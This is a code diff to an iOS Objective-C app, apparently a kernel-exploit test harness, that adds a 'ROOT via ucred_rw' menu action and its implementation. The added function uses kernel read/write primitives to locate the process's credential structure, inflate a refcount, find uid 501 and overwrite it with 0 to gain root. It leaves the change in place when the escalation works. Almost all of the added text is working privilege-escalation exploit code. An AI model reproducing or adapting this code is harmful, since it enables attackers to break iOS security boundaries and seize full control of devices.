@@ -504,6 +504,11 @@
                                             handler:^(UIAlertAction *a) {
         [weakSelf runKrwWriteTest];
     }]];
+    [sheet addAction:[UIAlertAction actionWithTitle:@"ROOT via ucred_rw (uid=0)"
+                                              style:UIAlertActionStyleDefault
+                                            handler:^(UIAlertAction *a) {
+        [weakSelf runRootViaUcredRw];
+    }]];
     [sheet addAction:[UIAlertAction actionWithTitle:@"Отмена" style:UIAlertActionStyleCancel handler:nil]];
     [self presentViewController:sheet animated:YES completion:nil];
 }
@@ -702,6 +707,101 @@
             [[KPLog shared] append:report];
             self.statusLabel.text = @"Weaponize завершён — см. лог";
             [self saveExperimentReport:report fileName:@"kexproof-weaponize.txt"];
+            self.jobRunning = NO;
+            [self updateExperimentButtons];
+        });
+    });
+}
+
+- (void)runRootViaUcredRw {
+    if (![self beginJob]) return;
+    self.statusLabel.text = @"ROOT via ucred_rw…";
+    [[KPLog shared] append:@"[RESULT] ROOT via ucred_rw — запуск"];
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        NSMutableString *r = [NSMutableString string];
+        [r appendString:@"\n=== ROOT via ucred_rw (type 0x21 writable) ===\n"];
+        extern uint64_t early_kread64(uint64_t where);
+        extern void early_kwrite64(uint64_t where, uint64_t what);
+        extern uint64_t kp_find_self_proc_by_pid(uint32_t pid);
+        extern uint64_t kvtophys(uint64_t kv);
+        extern uint64_t phystokv(uint64_t pa);
+        extern uint32_t off_proc_p_proc_ro;
+        extern uint32_t off_proc_ro_p_ucred;
+
+        // 1. Find self proc
+        uint64_t proc = kp_find_self_proc_by_pid(getpid());
+        if (!proc) { [r appendString:@"  proc not found\n"]; goto done; }
+        [r appendFormat:@"  proc = 0x%016llx\n", proc];
+
+        // 2. Walk to ucred: proc -> p_proc_ro -> ucred
+        uint64_t procRo = early_kread64(proc + off_proc_p_proc_ro);
+        [r appendFormat:@"  p_proc_ro = 0x%016llx\n", procRo];
+        uint64_t ucred = early_kread64(procRo + off_proc_ro_p_ucred);
+        [r appendFormat:@"  ucred = 0x%016llx\n", ucred];
+
+        // 3. Get ucred_rw (at ucred+0x00, type 0x21)
+        uint64_t ucredRw = early_kread64(ucred + 0x00);
+        [r appendFormat:@"  ucred_rw = 0x%016llx\n", ucredRw];
+        uint64_t rwPA = kvtophys(ucredRw & ~0x3fffULL);
+        [r appendFormat:@"  ucred_rw PA = 0x%016llx\n", rwPA];
+
+        // 4. Inflate refcount at ucred_rw+0
+        uint64_t ref0 = early_kread64(ucredRw);
+        [r appendFormat:@"  refcount before = 0x%016llx\n", ref0];
+        early_kwrite64(ucredRw, ref0 + 0x10000);
+        uint64_t refAfter = early_kread64(ucredRw);
+        [r appendFormat:@"  refcount after  = 0x%016llx  %s\n", refAfter,
+            (refAfter == ref0 + 0x10000) ? "INFLATED OK" : "FAILED"];
+
+        // 5. Find uid cluster in ucred_rw+0x10 (posix_cred)
+        uint64_t rw10 = early_kread64(ucredRw + 0x10);
+        [r appendFormat:@"  rw10 (posix_cred?) = 0x%016llx\n", rw10];
+        // Scan for 501 in rw10 area
+        int found501 = 0;
+        for (uint32_t o = 0; o < 0x80; o += 8) {
+            uint64_t q = early_kread64(ucredRw + 0x10 + o);
+            if ((uint32_t)q == 501 || (uint32_t)(q >> 32) == 501) {
+                [r appendFormat:@"  ★ 501-cluster at ucred_rw+0x%02x = 0x%016llx\n", 0x10 + o, q];
+                found501 = 1;
+                // Write uid=0 to the low half
+                uint64_t saved = q;
+                uint64_t newVal = q & 0xffffffff00000000ULL;  // zero low 32 bits (uid)
+                early_kwrite64(ucredRw + 0x10 + o, newVal);
+                uint64_t rb = early_kread64(ucredRw + 0x10 + o);
+                [r appendFormat:@"  wrote uid=0: 0x%016llx -> 0x%016llx (readback 0x%016llx)\n", saved, newVal, rb];
+                // Check getuid
+                uid_t u = getuid();
+                [r appendFormat:@"  getuid() = %d\n", u];
+                if (u == 0) {
+                    [r appendString:@"  >>> ROOT!!! UID=0 ACHIEVED!\n"];
+                    // Don't restore — we're root!
+                } else {
+                    [r appendString:@"  getuid unchanged — restoring\n"];
+                    early_kwrite64(ucredRw + 0x10 + o, saved);
+                }
+                break;
+            }
+        }
+        if (!found501) {
+            [r appendString:@"  501-cluster not found in ucred_rw+0x10 area\n"];
+            // Try scanning more
+            for (uint32_t o = 0; o < 0x200; o += 8) {
+                uint64_t q = early_kread64(ucredRw + o);
+                if ((uint32_t)q == 501) {
+                    [r appendFormat:@"  ★ 501 at ucred_rw+0x%02x = 0x%016llx\n", o, q];
+                }
+            }
+        }
+
+        // Restore refcount
+        early_kwrite64(ucredRw, ref0);
+        [r appendString:@"  refcount restored\n"];
+
+    done:
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [[KPLog shared] append:r];
+            self.statusLabel.text = [NSString stringWithFormat:@"ROOT test — uid=%d", (int)getuid()];
+            [self saveExperimentReport:r fileName:@"kexproof-root-ucredrw.txt"];
             self.jobRunning = NO;
             [self updateExperimentButtons];
         });
